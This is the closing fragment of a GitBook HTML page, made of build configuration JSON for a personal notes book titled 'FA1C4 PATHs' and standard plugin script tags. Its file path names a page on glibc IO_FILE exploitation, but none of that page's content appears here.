MS"},"highlight":{},"theme-comscore":{},"sharing":{"all":["facebook","google","twitter","weibo","instapaper"],"facebook":true,"google":false,"instapaper":false,"twitter":true,"vk":false,"weibo":false},"theme-default":{"showLevel":false,"styles":{"ebook":"styles/ebook.css","epub":"styles/epub.css","mobi":"styles/mobi.css","pdf":"styles/pdf.css","print":"styles/print.css","website":"styles/website.css"}},"toggle-chapters":{"toggle":true}},"theme":"default","author":"fa1c4","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"FA1C4 PATHs","language":"en","gitbook":"*","description":"Paths of fa1c4 to strive"},"file":{"path":"pwn/glibc_IO_FILE_exploitation.md","mtime":"2024-12-31T13:50:36.219Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2025-04-25T14:14:58.851Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-toggle-chapters/toggle.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-livereload/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
        
    

    </body>
</html>

